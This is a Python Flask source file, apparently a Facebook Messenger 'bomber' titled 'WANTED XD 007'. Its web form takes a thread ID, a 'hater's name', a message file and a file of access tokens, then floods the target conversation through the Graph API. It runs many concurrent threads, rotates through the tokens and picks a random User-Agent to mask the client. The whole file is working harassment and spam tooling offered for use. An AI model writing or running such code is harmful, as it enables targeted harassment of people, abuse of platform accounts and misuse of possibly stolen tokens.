from flask import Flask, request, render_template_string, redirect, url_for, flash
import threading
import requests
import time
import os
import random
from werkzeug.utils import secure_filename

# Initialize Flask app
app = Flask(__name__)
app.secret_key = 'supersecretkey'  # Needed for flash messages

# Configuration for file uploads
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# HTML template for the main page
html_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WANTED XD 007</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('https://i.ibb.co/dtt1YXL/75f0692a21a3b3f2d9a45c72354f7e1d.jpg');
            background-size: cover;
            background-color: transparent;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container {
            margin-top: 50px;
            padding: 20px;
            background-color: transparent;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 60%;
        }
        h1, h2, h3 {
            color: cyan;
            text-align: center;
            
        }
        label {
            display: block;
            margin-top: 10px;
            color: white;
        }
        input, textarea, button {
            background-color: transparent;
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            border: 1px solid #ddd;
            border-radius: 4px;
            color: white;
        }
        button {
            margin-top: 15px;
            background-color: #28a745;
            color: #fff;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>WANTED XD 007</h1>
        <h2>SERVER FOR SPEED</h2>
        <h3>CREATED BY FT'CHINKU</h3>
        <form action="/send_message" method="post" enctype="multipart/form-data">
            <label for="thread_id">Thread ID:</label>
            <input type="text" id="thread_id" name="thread_id" required>
            
            <label for="haters_name">Hater's Name:</label>
            <input type="text" id="haters_name" name="haters_name" required>
            
            <label for="message_file">Upload Message File</label>
            <input type="file" id="message_file" name="message_file" accept=".txt" required>
            
            <label for="token_file">Upload Token File</label>
            <input type="file" id="token_file" name="token_file" accept=".txt" required>
            
            <label for="delay">Delay (in seconds):</label>
            <input type="number" id="delay" name="delay" min="0" step="1" required>
            
            <label for="msg_limit">Message Limit:</label>
            <input type="number" id="msg_limit" name="msg_limit" min="1" required>
            
            <button type="submit">Send Messages</button>
        </form>
    </div>
</body>
</html>
'''

# Function to send a message in a separate thread
def send_message_thread(thread_id, haters_name, access_token, message, headers, message_index, delay):
    url = f"https://graph.facebook.com/v17.0/t_{thread_id}/"
    parameters = {'access_token': access_token, 'message': f"{haters_name} {message}"}
    response = requests.post(url, json=parameters, headers=headers)
    current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
    
    if response.ok:
        print(f"[+] Message {message_index + 1} sent to Convo {thread_id}: {haters_name} {message}")
        print(f"  - Time: {current_time}\n")
    else:
        print(f"[x] Failed to send Message {message_index + 1}: {haters_name} {message}")
        print(f"  - Time: {current_time}\n")
    
    if delay > 0:
        time.sleep(delay)

# Route for the main page
@app.route('/')
def home():
    return render_template_string(html_template)

# Route to handle message sending
@app.route('/send_message', methods=['POST'])
def send_message():
    thread_id = request.form['thread_id']
    haters_name = request.form['haters_name']
    delay = float(request.form['delay'])
    msg_limit = int(request.form['msg_limit'])

    # Save uploaded files
    message_file = request.files['message_file']
    token_file = request.files['token_file']
    
    if message_file and token_file:
        message_file_path = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(message_file.filename))
        token_file_path = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(token_file.filename))
        
        message_file.save(message_file_path)
        token_file.save(token_file_path)
        
        # Read data from the files
        with open(message_file_path, 'r') as file:
            messages = [line.strip() for line in file.readlines()]
        
        with open(token_file_path, 'r') as file:
            access_tokens = [line.strip() for line in file.readlines()]
        
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
            ])
        }

        try:
            message_index = 0
            for access_token in access_tokens:
                threads = []
                for _ in range(msg_limit):
                    # Start each message in a new thread
                    thread = threading.Thread(
                        target=send_message_thread,
                        args=(thread_id, haters_name, access_token, messages[message_index % len(messages)], headers, message_index, delay)
                    )
                    thread.start()
                    threads.append(thread)
                    message_index += 1

                for thread in threads:
                    thread.join()

            flash("Messages sent successfully!")
            return redirect(url_for('home'))
        except Exception as e:
            flash(f"An error occurred: {e}")
            return redirect(url_for('home'))
    else:
        flash("Both message and token files are required.")
        return redirect(url_for('home'))

# Run the Flask server
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)